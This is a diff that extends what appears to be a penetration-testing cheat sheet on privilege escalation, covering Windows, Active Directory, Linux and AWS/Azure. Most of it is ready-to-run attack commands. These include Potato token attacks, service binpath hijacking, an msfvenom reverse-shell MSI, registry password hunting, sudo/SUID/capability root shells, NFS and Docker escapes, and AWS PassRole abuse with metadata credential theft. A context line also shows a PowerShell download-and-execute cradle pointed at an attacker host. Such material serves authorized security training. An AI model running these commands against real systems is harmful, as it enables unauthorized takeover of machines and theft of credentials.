@@ -1229,6 +1229,221 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://A
 
 ---
 
+---
+
+## 8. Deep-Dive Supplement: Windows Privesc
+
+### Token Impersonation / Potato Attacks
+
+| Attack | Condition | Tool | Notes |
+|---|---|---|---|
+| PrintSpoofer | SeImpersonatePrivilege | PrintSpoofer.exe | Works Server 2019/2022 |
+| RoguePotato | SeImpersonatePrivilege | RoguePotato.exe | Improved JuicyPotato for newer Windows |
+| GodPotato | SeImpersonatePrivilege | GodPotato.exe | Works Windows 2012-2022 |
+| SweetPotato | SeImpersonatePrivilege | SweetPotato.exe | Combines multiple Potato techniques |
+| JuicyPotatoNG | SeImpersonatePrivilege | JuicyPotatoNG.exe | Updated JuicyPotato for modern Windows |
+
+### Unquoted Service Paths (Extended)
+
+```cmd
+wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+sc qc "Vulnerable Service"
+icacls "C:\Program Files\Vulnerable"
+```
+
+If `C:\Program Files\Vulnerable App\service.exe` place `C:\Program.exe` or `C:\Program Files\Vulnerable.exe`.
+
+### DLL Hijacking (Checklist)
+
+```powershell
+# Find missing DLLs via Procmon filter: Result is NAME NOT FOUND, Path ends in .dll
+# Check DLL search order: application dir -> System32 -> System -> Windows -> CWD -> PATH
+# Check write permissions on directories in search order
+icacls "C:\Program Files\App"
+```
+
+### Weak Service ACLs (Extended)
+
+```cmd
+accesschk.exe -uwcv Everyone *
+accesschk.exe -uwcv "Authenticated Users" *
+sc config "VulnSvc" binpath= "C:\Windows\Temp\shell.exe"
+sc stop VulnSvc && sc start VulnSvc
+```
+
+### AlwaysInstallElevated (Extended)
+
+```powershell
+# Check registry (both keys must be 1)
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# Exploit: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o evil.msi
+msiexec /quiet /qn /i C:\Users\Public\evil.msi
+```
+
+### Scheduled Tasks (Extended)
+
+```cmd
+schtasks /query /fo LIST /v | findstr /i "task name\|run as\|program\|status"
+accesschk.exe -wvu "C:\path\to\task\binary.exe"
+```
+
+### Windows Credential Hunting
+
+```powershell
+# Saved credentials
+cmdkey /list
+runas /savecred /user:DOMAIN\admin cmd.exe
+
+# Registry password hunting
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+# Unattend.xml locations
+# C:\Unattend.xml
+# C:\Windows\Panther\Unattend.xml
+# C:\Windows\Panther\Unattend\Unattend.xml
+# C:\Windows\system32\sysprep.inf
+# C:\Windows\system32\sysprep\sysprep.xml
+```
+
+---
+
+## 9. Deep-Dive Supplement: Active Directory Privesc
+
+| Technique | Description | Tool |
+|---|---|---|
+| Kerberoasting | Request TGS for service accounts, crack offline | Rubeus, Impacket GetUserSPNs.py |
+| AS-REP Roasting | Accounts with no preauth, crack AS-REP hash | Rubeus asreproast, GetNPUsers.py |
+| DCSync | Replicate domain secrets via MS-DRSR | Mimikatz lsadump::dcsync, secretsdump.py |
+| Pass-the-Hash | Use NTLM hash without cracking | Mimikatz, CrackMapExec, PsExec |
+| Pass-the-Ticket | Inject Kerberos ticket into session | Rubeus, Mimikatz kerberos::ptt |
+| Golden Ticket | Forge TGT using KRBTGT hash | Mimikatz kerberos::golden |
+| Silver Ticket | Forge TGS using service account hash | Mimikatz kerberos::silver |
+| Overpass-the-Hash | Convert NTLM hash to Kerberos TGT | Rubeus, Mimikatz sekurlsa::pth |
+| BloodHound ACL Abuse | Exploit GenericAll, WriteDACL, ForceChangePassword | SharpHound + BloodHound |
+| ADCS ESC1 | SAN abuse in certificate templates | Certipy, Certify |
+| ADCS ESC4 | Write DACL over certificate template | Certipy |
+| ADCS ESC8 | NTLM relay to ADCS web enrollment | ntlmrelayx + Certipy |
+
+---
+
+## 10. Deep-Dive Supplement: Linux Privesc
+
+### SUID / SGID Binaries (Extended)
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+# GTFOBins lookup: https://gtfobins.github.io/
+# Example: find with -exec
+find . -exec /bin/sh -p \; -quit
+```
+
+### Sudo Misconfigurations (Extended)
+
+```bash
+sudo -l
+# (ALL : ALL) NOPASSWD: /usr/bin/vim  ->  sudo vim -c ':!/bin/bash'
+# (ALL) NOPASSWD: /usr/bin/find       ->  sudo find /etc -exec /bin/sh \;
+```
+
+### Cron Job Abuse (Extended)
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron.*
+# Check if script is writable or if directory is writable
+find / -writable -type f 2>/dev/null | grep -v proc
+```
+
+### Capabilities (Extended)
+
+```bash
+getcap -r / 2>/dev/null
+# python3 cap_setuid -> python3 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash")'
+# perl cap_setuid   -> perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
+```
+
+### NFS No_root_squash (Extended)
+
+```bash
+cat /etc/exports
+showmount -e TARGET_IP
+# If no_root_squash is present:
+mount -o rw,vers=3 TARGET_IP:/share /tmp/mount
+cp /bin/bash /tmp/mount/bash && chmod +s /tmp/mount/bash
+# On target: /tmp/share/bash -p
+```
+
+### Docker / LXC Escape
+
+```bash
+# Docker group membership: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# Writable docker socket:
+ls -la /var/run/docker.sock
+docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh
+```
+
+---
+
+## 11. Deep-Dive Supplement: Cloud Privesc
+
+### AWS Privilege Escalation
+
+```bash
+# Check current identity
+aws sts get-caller-identity
+
+# List attached/inline policies
+aws iam list-attached-user-policies --user-name USERNAME
+aws iam list-user-policies --user-name USERNAME
+
+# Check for privilege escalation paths (PMapper / Pacu)
+python3 -m principalmapper graph --create
+python3 -m principalmapper query "who can become admin"
+
+# Common escalation: PassRole + EC2 instance profile
+aws iam create-instance-profile --instance-profile-name evil
+aws iam add-role-to-instance-profile --role-name AdminRole --instance-profile-name evil
+# Launch EC2 with the profile, then from the instance:
+# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
+```
+
+### Azure Privilege Escalation
+
+```powershell
+# Check current identity
+az account show
+az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --all
+
+# Common escalations:
+# Contributor on subscription -> deploy managed identity with Owner
+# User Access Administrator   -> grant self Owner
+# Global Reader + Automation  -> read runbook credentials
+Get-AzRoleAssignment | Where-Object {$_.RoleDefinitionName -eq "Owner"}
+```
+
+---
+
+## 12. Automated Enumeration Tools (Extended Reference)
+
+| Tool | OS | Command | Notes |
+|---|---|---|---|
+| WinPEAS | Windows | `.\winpeas.exe` | Most comprehensive Windows enum |
+| PowerUp | Windows | `Invoke-AllChecks` | PowerShell privesc checks |
+| Seatbelt | Windows | `.\Seatbelt.exe -group=all` | Security config audit |
+| SharpUp | Windows | `.\SharpUp.exe audit` | C# port of PowerUp |
+| LinPEAS | Linux | `./linpeas.sh` | Most comprehensive Linux enum |
+| LinEnum | Linux | `./LinEnum.sh -t` | Classic Linux enumeration |
+| linux-exploit-suggester | Linux | `./les.sh` | Kernel exploit suggestions |
+| LES2 | Linux | `./les2.sh` | Updated LES for newer kernels |
+| Sudo_killer | Linux | `./sudo_killer.sh -c -r report` | Advanced sudo abuse detection |
+| pspy | Linux | `./pspy64` | Unprivileged process monitoring |
+| BeRoot | Both | `./beRoot.py` | Cross-platform privilege check |
+
+
 ## 7. Related Resources
 
 ### Internal
